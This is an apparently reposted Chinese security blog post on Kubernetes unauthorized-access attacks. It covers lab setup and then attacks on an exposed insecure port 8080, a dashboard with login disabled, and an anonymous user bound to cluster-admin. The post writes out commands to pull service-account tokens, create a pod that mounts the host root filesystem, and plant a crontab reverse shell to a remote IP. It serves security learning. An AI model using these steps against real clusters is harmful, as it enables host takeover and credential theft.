#  转载 | 浅析K8S各种未授权攻击方法   
UzJu  无影安全实验室   2025-02-10 13:05  
  
免责声明：  
本篇文章仅用于技术交流，  
请勿利用文章内的相关技术从事非法测试  
，  
由于传播、利用本公众号无影安全  
实验室所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号无影安全实验室及作者不为此承担任何责任，一旦造成后果请自行承担！  
如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
  
  
朋友们现在只对常读和星标的公众号才展示大图推送，建议大家把"**无影安全实验室**  
"设为星标，这样更新文章也能第一时间推送！  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/3GHDOauYyUGbiaHXGx1ib5UxkKzSNtpMzY5tbbGdibG7icBSxlH783x1YTF0icAv8MWrmanB4u5qjyKfmYo1dDf7YbA/640?&wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
  
安全文章  
  
  
  
# 一、前言  
  
这篇文章可能出现一些图文截图颜色或者命令端口不一样的情况，原因是因为这篇文章是我重复尝试过好多次才写的，所以比如正常应该是访问6443，但是截图中是显示大端口比如60123这种，不影响阅读和文章逻辑，无需理会即可，另外k8s基础那一栏。。。本来想写一下k8s的鉴权，后来想了想，太长了，不便于我查笔记，还不如分开写，所以K8S基础那里属于凑数？？？写了懒得删（虽然是粘贴的：））  
  
吐槽一下：其实我发现K8S搭建失败的大部分原因，都是出于网络不同的原因，所以我建议直接上香港的服务器，不太建议在本地虚拟机搭建，当然我本地也搭建了虚拟机的k8s集群（我用公司的阿里云开的服务器，100M带宽，确实快哈哈哈）  
  
在学习k8s安全的时候，大家花费最多时间的地方应该就是K8S的搭建了，当然大佬除外，我这种菜狗才会搭环境搭很久  
  
香港服务器搭建  
  
1、有成本（哪怕是按量付费，也有一定的成本）  
  
2、好处就是能快速的搭建，不会出现网络导致搭建失败的问题  
  
本地虚拟机搭建  
  
1、0成本（但是有时间成本，可能在香港服务器上1个小时就能解决的事情，在本地要花很久）  
  
2、好处就是配置好静态地址之后，以后在哪个网络环境都可以访问  
# 二、k8s基础  
  
![89bb8f54fc5c96249c42867fbf9e8b88.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfX069OB7FcmvPFic7BGzoTtJJ8ia9JKamicxBLJQVqWJPJ5NyT4ssBDI7w/640?wx_fmt=png&from=appmsg "")  
  
K8S全称kubernetes，是由Google在2014年开源的生产级别的容器编排系统，或者说是微服务和云原生平台。虽说14年才开源，但实际上K8S是Google内部的容器编排系统Borg的开源版本，在Google内部已经用了十多年了。下面是一个关于K8S的Logo来源的小插曲。  
  
Kubernetes由谷歌在2014年首次对外宣布 。它的开发和设计都深受谷歌的Borg系统的影响，它的许多顶级贡献者之前也是Borg系统的开发者。在谷歌内部，Kubernetes的原始代号曾经是Seven，即星际迷航中友好的Borg(博格人)角色。Kubernetes标识中舵轮有七个轮辐就是对该项目代号的致意。  不过也有一个说法是，Docker的Logo是一个驮着集装箱的鲸鱼，也就是运输船，K8S的Logo是一个船舵，旨在引领着Docker（或者说容器技术）走向远方。  
## 1、Master  
  
Master节点是Kubernetes集群的控制节点，每个Kubernetes集群里至少有一个Master节点，它负责整个集群的决策（如调度），发现和响应集群的事件。Master节点可以运行在集群中的任意一个节点上，但是最好将Master节点作为一个独立节点，不在该节点上创建容器，因为如果该节点出现问题导致宕机或不可用，整个集群的管理就会失效。  
  
在Master节点上，通常会运行以下服务：  
- kube-apiserver: 部署在Master上暴露Kubernetes API，是Kubernetes的控制面。  
  
- etcd: 一致且高度可用的Key-Value存储，用作Kubernetes的所有群集数据的后备存储，在K8s中有两个服务需要用到etcd来协同和配置，分别如下  
  
- 网络插件 flannel、对于其它网络插件也需要用到 etcd 存储网络的配置信息  
  
- Kubernetes 本身，包括各种对象的状态和元信息配置  
  
- 注意：flannel 操作 etcd 使用的是 v2 的 API，而 Kubernetes 操作 etcd 使用的 v3 的 API，所以在下面我们执行 etcdctl 的时候需要设置 ETCDCTL_API 环境变量，该变量默认值为 2。  
  
- etcd实现原理：  
http://jolestar.com/etcd\-architecture/  
  
- kube-scheduler: 调度器，运行在Master上，用于监控节点中的容器运行情况，并挑选节点来创建新的容器。调度决策所考虑的因素包括资源需求，硬件/软件/策略约束，亲和和排斥性规范，数据位置，工作负载间干扰和最后期限。  
  
- kube-controller-manager：控制和管理器，运行在Master上，每个控制器都是独立的进程，但为了降低复杂性，这些控制器都被编译成单一的二进制文件，并以单独的进程运行。  
  
## 2、Node  
  
Node 节点是 Kubernetes 集群的工作节点，每个集群中至少需要一台Node节点，它负责真正的运行Pod，当某个Node节点出现问题而导致宕机时，Master会自动将该节点上的Pod调度到其他节点。Node节点可以运行在物理机上，也可以运行在虚拟机中。  
  
在Node节点上，通常会运行以下服务：  
- kubelet: 运行在每一个 Node 节点上的客户端，负责Pod对应的容器创建，启动和停止等任务，同时和Master节点进行通信，实现集群管理的基本功能。  
  
- kube-proxy: 负责 Kubernetes Services的通信和负载均衡机制。  
  
- Docker Engine: 负责节点上的容器的创建和管理。  
  
Node节点可以在集群运行期间动态增加，只要整个节点已经正确安装配置和启动了上面的进程。在默认情况下，kubelet会向Master自动注册。一旦Node被接入到集群管理中，kubelet会定时向Master节点汇报自身的情况（操作系统，Docker版本，CPU内存使用情况等），这样Master便可以在知道每个节点的详细情况的同时，还能知道该节点是否是正常运行。当Node节点心跳超时时，Master节点会自动判断该节点处于不可用状态，并会对该Node节点上的Pod进行迁移。  
## 3、Pod  
  
Pod是Kubernetes最重要也是最基本的概念，一个Pod是一组共享网络和存储（可以是一个或多个）的容器。Pod中的容器都是统一进行调度，并且运行在共享上下文中。一个Pod被定义为一个逻辑的host，它包括一个或多个相对耦合的容器。  
  
Pod的共享上下文，实际上是一组由namespace、cgroups, 其他资源的隔离的集合，意味着Pod中的资源已经是被隔离过了的，而在Pod中的每一个独立的container又对Pod中的资源进行了二次隔离。  
  
![9d54babb507067513f9fe76b1c50fe56.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfty3xLvEZLuf2acdGDtOyb2Ria14BnAibR5pTmeibWiakCshDpxxg0lZnlQ/640?wx_fmt=png&from=appmsg "")  
  
（上图为：K8s实战攻击路径，·来自TSRC）  
  
![1c00409e42721e453af11fc30e8d86e7.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfibe08uGJ20ib72G2OP6GccZuvmpPq5PWQLRG0yJicucyHKfYgGXx8Diczg/640?wx_fmt=png&from=appmsg "")  
  
  
（上图为：K8s常见端口，图片有点糊，因为网上找的）  
# 三、k8s-漏洞环境搭建  
## 1、metarget  
  
推荐这种方式搭建，目前能搜到的应该有以下几种K8S搭建方式  
  
1、按照文档一步一步的安装docker，安装k8s  
  
2、minikube  
  
3、kind  
  
4、metarget（推荐）  
  
5、github上的一键安装脚本  
  
但是这几种安装方式都充斥着一些问题，比如在安装的时候会遇到很多问题，而且如果我们想安装安装指定版本又非常麻烦，所以推荐metarget的方式进行安装  
```
git clone https://github.com/Metarget/metarget.gitcd metaget/ pip3 install -r requirements.txt
```  
  
tips: 如果在centos下遇到pip 出现以下情况，并且更新之后没有用的话，那么就用下面的方法  
  
![d84e2e5cc6d8395b45d51518535e624d.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfyePButq5kn0ayUrpicxCI66QtbHUyU5LiaaiaJghCYc30ZFP99DV7UYIg/640?wx_fmt=png&from=appmsg "")  
  
```
yum install python3-pip
```  
  
![bcda06346dca157b3d7bbf81b6ab11b7.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfBCbJh6drzs5tRR2icibekdu2hnmqchy6zV7MTCib9PknThibtY1sWibdFzQ/640?wx_fmt=png&from=appmsg "")  
  
不过这里建议Ubuntu安装，因为。。。  
  
![5dcdf3b53f14604a3465c56d889e133b.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfKSicvLxewLMeoTqsxoqeSFgXlf8ezNterWlbs4GR4vhdLfdZ0e7VOYg/640?wx_fmt=png&from=appmsg "")  
  
  
懒得搜了，所以直接换ubuntu  
  
回到正题，比如我这里想安装一个1.16的k8s，使用以下命令即可  
```
./metarget gadget install k8s --version=1.16.5
```  
  
![177f020824b630fe6bcb2fd5af8677d4.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKffaHPEiaqPmxuxDBh4CFnXIJGyD6Jx4IoSfhp3RWPffonvUfic73zqXPQ/640?wx_fmt=png&from=appmsg "")  
  
![6843bb43aaf1ad160daaae875fd1b9a5.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfwAkk2ZkEpnG59JPhndjUrJicYAicvYgLYMbCibZjvIGpr5kiaT2INjquTA/640?wx_fmt=png&from=appmsg "")  
  
随后就会对k8s所需要的组件挨个进行安装并启动  
  
![27d9fb8609830b1829a9a17cbbad3ef9.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfRMrqgqVUic72RibMOnDsTdvEoYGEVEj5EetbqQUY5oia52DHNajeSSoLQ/640?wx_fmt=png&from=appmsg "")  
  
  
不过值得注意的是，如果使用云服务器的话，为了保证端口安全组放通，但是又怕暴露在公网受到攻击，建议安全组端口全开，但是给到指定IP才能访问  
## 2、minikube  
  
环境  
- Macos Monterey  
  
下载minikube  
```
brew install minikube
```  
  
![cb92fe386a6477e59c5e64484858b9bc.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKf1k3CSseKatLFQTZeleFKSpAHPzKTLze8j3FEhibPC9iaib6r0GtgH8GUQ/640?wx_fmt=png&from=appmsg "")  
  
使用minikube快速启动，这里驱动选的是VMware，指定了k8s的版本  
```
minikube start --kubernetes-version=v1.16.3 --driver=vmware
```  
  
![e10a5e34f68c0688e7b2b6a65781545c.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfGSLB8APxalwc4vVeKjiaXl6dESukEoX3b8elgSgLOZM8Vdda85KfDDA/640?wx_fmt=png&from=appmsg "")  
```
minikube kubectl -- get pods -A
```  
  
![3a0149b17e40d6def2e9cfe5d0e2de56.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfFkODIfNrlu0qeUAImbcHsXj2laxq8GWjnx9mvMJu5RxADyFKvYm5uw/640?wx_fmt=png&from=appmsg "")  
```
minikube kubectl get node
```  
  
![9d4bd3df8196b6b4c16ee0483ce7328f.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfzaiaT4cHE1tlW7tQfw6VSe0u7frNfEN1rL4HY7lnicjw51x4E7vIJdTw/640?wx_fmt=png&from=appmsg "")  
  
还可以通过minikube 快速启动k8s的dashboard  
```
minikube dashboard
```  
  
![2f6dcf00b5476be4ac8a2607e8238909.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfSfYRRibNQE2EpicJicglf4QQwZXFUYzDDJNB0lsWf8cKWCnFY3xUzqsqg/640?wx_fmt=png&from=appmsg "")  
  
快速创建一个Nginx Pod  
```
kubectl run nginxfromuzju --image=nginx --port=1112
```  
  
![ccb2858e7a02f608106f370f00cf2006.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfGuHiaTY8tjKtiawxOupqqzS0MulVT8nnbdXvRGugrX6SHOa5cv5f3BCA/640?wx_fmt=png&from=appmsg "")  
## 3、kind  
  
安装kubectl  
```
curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.23.6/bin/linux/amd64/kubectlchmod +x ./kubectlmv ./kubectl /usr/local/bin/kubectl
```  
  
下载kind(需要科学上网)  
```
wget https://github.com/kubernetes-sigs/kind/releases/download/v0.12.0/kind-darwin-amd64chmod +x kind-darwin-amd64mv ./kind-darwin-amd64 /usr/local/bin/kind
```  
  
![b649753b20ffebcbc69c33bf5d0daf7c.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfFRPfXDZhkQ3zBXgOXnQjSALFjiavVuFXTXUhib4Qtib3AlhRic0ToAPDbw/640?wx_fmt=png&from=appmsg "")  
```
kind create cluster --name k8s
```  
  
快速启动一个k8s集群  
  
![d82a945547fed1157551ffb424ee99ac.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKf1USKltnOy8WES24BdbYzPTymLWvUZCb2QC1pZvu1GgIbfVd8lgTwsA/640?wx_fmt=png&from=appmsg "")  
  
```
kind: ClusterapiVersion:kind.x-k8s.io/v1alpha4name:k8suzju#集群名nodes:#节点配置，如下，启动一个master节点，一个worker节点-role:control-plane   #master节点image:kindest/node:v1.21.1#指定镜像，同 kind create cluster参数--imageextraPortMappings:-containerPort:6443    hostPort:26443    listenAddress:"0.0.0.0"    protocol:tcp#默认值，可不设置-role: worker
```  
  
为了解决绑定在本地127.0.0.1的问题  
```
kind create cluster --config k8s.yaml
```  
  
![4cdc4482dea19c683c41f6e1c01ccbb7.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfLIGMDhYcgySaw7Swcxt2kp4mqJIklaXL6VvaVffLd2QSwTibExY9iaBQ/640?wx_fmt=png&from=appmsg "")  
```
kubectl get node
```  
  
![219c3cd5d48d28745b7b6a4475eb3881.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfexNfg33hjVnMfdeTT1E9F9beKoKA5wWmmstGVGoWvyXGzFESLok3Dw/640?wx_fmt=png&from=appmsg "")  
  
创建pods  
```
kubectl run nginxfromuzju --image=nginx --port=1112
```  
  
![e536430365e335bebab01eb8723f51bb.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfLIcq30X0hAsABJ8kjGaxRiaQcZibhOLD4b9HMCzcLgegQmH5STXxD8Zg/640?wx_fmt=png&from=appmsg "")  
# 四、Api Server 未授权访问(8080与6443）  
  
部署在Master上暴露Kubernetes API，是Kubernetes的控制面。Kubernetes API服务器为API对象验证和配置数据，这些对象包含Pod，Service，ReplicationController等等。API Server提供REST操作以及前端到集群的共享状态，所有其他组件可以通过这些共享状态交互。默认情况，Kubernetes API Server提供HTTP的两个端口：8080，6443。insecure-port： 默认端口8080，在HTTP中没有认证和授权检查。secure-port ：默认端口6443， 认证方式，令牌文件或者客户端证书，如下图访问http://IP:8080  
  
![0a65117ff129c62cd193d9c674327c74.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfG8L6GIfmlpHaLiccIxicaZu09Dlshk0WtzjWlzRW8fmJ9hIb0PTaV1Jg/640?wx_fmt=png&from=appmsg "")  
  
  
一个6443和一个8080，前者会进行鉴权，后者不会  
  
![1d10223baa3d1fd6138318c14039aac5.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfbkSCbAfIGoBiadhBcHt230cuCxgGWib0OQ63TnqOx9Oibzv65OpETYDtw/640?wx_fmt=png&from=appmsg "")  
  
## 1、8080端口未授权访问  
  
条件  
  
1、k8s版本小于1.16.0  
  
2、8080对公网开放  
### 1、如何打开和关闭8080端口  
  
测试了几个版本的k8s，发现在新版本后，–insecure-port=8080配置默认就关闭了  
```
cd /etc/kubernetes/manifestsvim kube-apiserver.yaml
```  
  
![765e7f6033e46761d207f6a8fcf9fa0a.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfyXHfXu0Cy6M8e6LoIib6sH0DbPgzuL1BEBlkOrHVwuQtM7lALbqvPUQ/640?wx_fmt=png&from=appmsg "")  
  
这里设置为0表示关闭，甚至在高版本的k8s中，直接将--insecure-port这个配置删除了，需要手动添加  
  
这里将修改为8080，并添加配置  
```
- --insecure-port=8080- --insecure-bind-address=0.0.0.0systemctl restart kubelet
```  
  
上述就是打开8080端口的方法  
  
![2b15b7ccbae2d924f15778d722b7042f.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfibgPtH4csW4hgP8g3HoVicCSTKAWYSfNK69icPbfic1oKUsXhDMJWqzXuA/640?wx_fmt=png&from=appmsg "")  
  
  
![c86dacdfadb8ca473eaf01fe083cb08c.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfBv8cxRRegibRFqNclBGypdYcypne1XCLQlE6MibAfu3wk22UZL1ZClOw/640?wx_fmt=png&from=appmsg "")  
### 2、执行命令-通过kubectl -s命令  
```
kubectl -s ip:8080 get node
```  
  
ps: 如果使用minikube搭建这里可能是随机的大端口  
  
![84258e5af2b31d38d0be47bb6586a9e5.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKf9XlWn56BYsLHtNGswpaFmghwS28cd42h2OYQfuQaicZXcGkjcaqb9Cg/640?wx_fmt=png&from=appmsg "")  
  
  
获取Pods  
```
kubectl -s 127.0.0.1:8080 get pods
```  
  
![07ef43516739c668c57b7584440e4a05.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfGPmFQbt6UIKibegwwiajXmsUtDnC3iaAb2d6fNFdEoia8zskzbvp2iaWibWA/640?wx_fmt=png&from=appmsg "")  
  
![910475d876816175ba00f4b5cfa50094.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfkoTknibN0vdEhhlyhNfVjOhwdTwGubUDwpOrP6nJl8y3Y8Qga6ZibTLQ/640?wx_fmt=png&from=appmsg "")  
  
执行命令  
```
kubectl -s 127.0.0.1:8080 --namespace=default exec -it nginxfromuzju-59595f6ffc-p8xvk bash
```  
  
![98c0e7e91838c2c562a3835d53f2a528.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfTZkDNnY3Ua0Lja9nzNK0NNQwQms0vkNV2bL9XQD1qaYkf73SG8iaqGw/640?wx_fmt=png&from=appmsg "")  
  
Tips: 在高版本的k8s中，这种方法是不行的，连不上去  
### 3、获取service-account-token  
  
可以通过访问api来获取token  
```
/api/v1/namespaces/kube-system/secrets/
```  
  
![ecac30d83cabd41b0469f76b2d5c8cd0.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfSfq1pwUib3YgJNyXTEUumvR2HTS7aJU5LWvOUZU3G7PpDteWVFicQIgw/640?wx_fmt=png&from=appmsg "")  
### 3、获取宿主机权限-通过k8s dashboard，创建特权Pods  
  
为什么会出现这个问题：因为在启动dashborad的时候，管理员为了方便，修改了配置，跳过了登录  
  
安装dashborad  
```
wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.2.0/aio/deploy/recommended.yamlvim recommended.yam
```  
  
![73dc5734cbddab261716a0148a795ddd.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfw5eHZvxV716jYedaA6uGafRhUMFmfibx2futR4N6iaNKrjvACeiaZdTjg/640?wx_fmt=png&from=appmsg "")  
  
需要添加两个参数，一个是不需要登录，一个是绑定0.0.0.0地址  
```
- --enable-skip-login- -- insecure-bind-address=0.0.0.0kubectl apply -f recommended.yaml
```  
  
![4c29e93960cc598b8b9fadd712ad9ddd.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfzWvURk8Qr7djV38xB8yECK2kNA1XcpibAticC8v1qttZEuSovxds6d9Q/640?wx_fmt=png&from=appmsg "")  
  
这里使用国际友人的配置快速启动  
- [  
https://medium.com/@tejaswi.goudru/disable\-authentication\-https\-in\-kubernetes\-dashboard\-2fada478ce91  
](mailto:  
https://medium.com/@tejaswi.goudru/disable-authentication-https-in-kubernetes-dashboard-2fada478ce91  
)  
  
```
wget https://gist.githubusercontent.com/tejaswigk/da57d7911284cbf56e7f99af0afd6884/raw/de38da2a7619890a72d643d2bbd94278221e5977/insecure-kubernetes-dashboard.ymlkubectl apply -f insecure-kubernetes-dashboard.yml kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard  9090:80
```  
  
![466ddfe06ee9230a11fccb426d1ec6ba.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfe6qjwEqQrLiacHekhvpwPxrVXkRXxXD981HGIibOKnoKeUg9CbdVeNFQ/640?wx_fmt=png&from=appmsg "")  
  
如果这种情况不能访问的话，就使用下面的命令  
```
kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard --address 0.0.0.0 9090:80
```  
  
![13bd5402d89faa62143a0f22b31e9b10.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfpT4ZfSQOiare7WUXZNjq511eibr7Y67hzgW9zUHqCFTU6O6WM2A7WZWA/640?wx_fmt=png&from=appmsg "")  
  
但是我们在这里看到了一个不安全的访问，无法登陆，只需要更换如下的命令即可  
```
kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard --address 0.0.0.0 9090:443
```  
  
![77d0a9a25cc83c241d058b74974b2cdc.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfJMCtxJHskYgCiadFRf3Efe00qOneGurJll6BhTyKIDtg99KMjjiaA3QA/640?wx_fmt=png&from=appmsg "")  
  
配置账号  
```
sudo vimaccount.yaml# Creating a Service AccountapiVersion:v1kind:ServiceAccountmetadata:name:admin-usernamespace:kubernetes-dashboard---# Creating a ClusterRoleBindingapiVersion:rbac.authorization.k8s.io/v1kind:ClusterRoleBindingmetadata:name:admin-userroleRef:apiGroup:rbac.authorization.k8s.iokind:ClusterRolename:cluster-adminsubjects:-kind:ServiceAccountname:admin-usernamespace:kubernetes-dashboardkubectlapply-faccount.yaml# 获取tokenkubectl-nkubernetes-dashboardgetsecret$(kubectl-nkubernetes-dashboardgetsa/admin-user-ojsonpath="{.secrets[0].name}")-ogo-template="{{.data.token| base64decode}}"
```  
  
![a96c83fd024c0fdaaea1784a76a77230.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKf8Y2Ie2JPajr4shHMUQzSu2xIAU4k1JvUkeTsyvlLs492rtIwqTWVbA/640?wx_fmt=png&from=appmsg "")  
  
这里有个坑。。。。就是端口转发然后会一直连接重置  
  
![620776abfd4ddba1ced3ab087459ded5.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfzhNs91r34yicaxMcE27T5AKdjIu8AEd14RyQkMU5kcs0iaPsmgPUUOhQ/640?wx_fmt=png&from=appmsg "")  
  
  
不知道什么原因，如果有大佬知道，虚心请教！这里也有可能是香港服务器不稳定的原因造成的，因为在测试的时候发现有时候服务器的ssh也连不上，也会提示连接重置  
  
通过创建dashboard创建pod并挂在宿主机的根目录  
```
apiVersion: v1kind:Podmetadata:name:myappspec:containers:-image:nginx    name:container    volumeMounts:    -mountPath:/mnt      name:test-volumevolumes:-name:test-volume    hostPath:      path: /
```  
  
这里将宿主机的目录挂在到了/mnt目录下  
  
![f4405cf71bba809e0f45a30209d313e7.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKficDbia0QZuVUe9HYXLKvUDxqcz7bjqq6U7upLjetRLKbcibtibnccUacQg/640?wx_fmt=png&from=appmsg "")  
  
  
ps: minikube 搭建如果此时点击上传返回错误信息the server could not find the requested resource，在网上看到文章说是kubectl的版本不一致的问题，那么也确实，因为minikube启动的是1.16的k8s，但是终端的是1.23，不过不要紧回到POD那里之后可以看到已经创建了  
  
![dd02dc0649f9b6fce3ee1a3c38f73a19.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfnVEf6gkld5VOuT5xXZKO7NrCoOTdXmY1iczicpaLQmY6f99ibtwaM7aiaA/640?wx_fmt=png&from=appmsg "")  
  
  
![0bcb884599c59bae08ffe611c06f1bc9.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfeCZiaOicNFuCOiaPddl9l3j7LlQFX8Mr8C0SzB7kxQGNnNxxLwmV6IDAw/640?wx_fmt=png&from=appmsg "")  
  
可以通过写crontab获取shell  
```
echo -e "* * * * * /bin/bash -i >& /dev/tcp/192.168.0.139/1234 0>&1" >> /mnt/etc/crontab
```  
  
或者通过chroot来获取终端  
  
![28e9abcd198921874f803b64c33e51aa.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKf9tChmC3SzKYUkeGGNtKdrtpiaDBoFbjoUC5RW3ofEcXIEDRfCicb8t0w/640?wx_fmt=png&from=appmsg "")  
  
## 2、6443端口-system:anonymous错误配置  
  
如果不小心，将"system:anonymous"用户绑定到"cluster-admin"用户组，从而使6443 端口允许匿名用户以管理员权限向集群内部下发指令  
  
本来访问会返回403  
  
![017a7599eb81fa4c8e195ff8a3c6500c.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfiagkjj8EIqxYoJYy4RCcPD4whfSbtFkZtzLHc0RlujqfOicEzUfolJcQ/640?wx_fmt=png&from=appmsg "")  
  
  
但是使用下面的配置之后就可以了  
```
kubectl create clusterrolebinding system:anonymous --clusterrole=cluster-admin --user=system:anonymous
```  
  
![63bbafff06f56334bf858d5127006ea2.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfd5ibDHrT1bWyHxoQ0MDtic9NWwkjGAdOPm9bXUaZ3y6KO8s6DZVWgNBA/640?wx_fmt=png&from=appmsg "")  
  
可以通过访问API来获取pod  
```
/api/v1/namespaces/default/pods
```  
  
![image-20220508144446715](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfnPmXR5InjvkhuYdeXicvjM3DyEGib4tw8FmhAWstJdRJS0h8AZEJ2xNA/640?wx_fmt=png&from=appmsg "")  
  
获取token  
```
/api/v1/namespaces/kube-system/secrets/
```  
  
![75eb8d626288606c711d746a3eaeb866.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfPfgxkWpS6kJvS3gekr3CV7pU3lOLm97Q4XXbytnb04u0WWt0a5eC6A/640?wx_fmt=png&from=appmsg "")  
  
创建特权容器  
```
POST /api/v1/namespaces/default/pods HTTP/2Host: 127.0.0.1:61575User-Agent: Mozilla/5.0 (Macintosh; IntelMacOSX10.15; rv:99.0) Gecko/20100101Firefox/99.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Te: trailersContent-Length: 1176{    "apiVersion": "v1",    "kind": "Pod",    "metadata": {        "annotations": {            "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"test-4444\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"name\":\"test-4444\",\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host\"}]}],\"volumes\":[{\"hostPath\":{\"path\":\"/\",\"type\":\"Directory\"},\"name\":\"host\"}]}}\n"        },        "name": "test-4444",        "namespace": "default"    },    "spec": {        "containers": [            {                "image": "nginx:1.14.2",                "name": "test-4444",                "volumeMounts": [                    {                        "mountPath": "/host",                        "name": "host"                    }                ]            }        ],        "volumes": [            {                "hostPath": {                    "path": "/",                    "type": "Directory"                },                "name": "host"            }        ]    }}
```  
  
![116aa2c7a386af0777d54994a2e22169.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfnuCvz26ibXVsIolGFNfQl9dyPSvCllR2jAsRWwhWkJQu8tGQSt5mjEQ/640?wx_fmt=png&from=appmsg "")  
  
随后执行命令的时候返回400  
```
https://127.0.0.1:61575/api/v1/namespaces/default/pods/test-4444/exec?stdout=1&stderr=1&tty=true&command=whoami
```  
  
![b700549ae7f8c29a9d8dcdb9e44520d9.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfNwLquFiaov32cwBxtDO1XRKfrQpZ8YAT9Y6jiajPvBV7y9DYNJFrficOw/640?wx_fmt=png&from=appmsg "")  
  
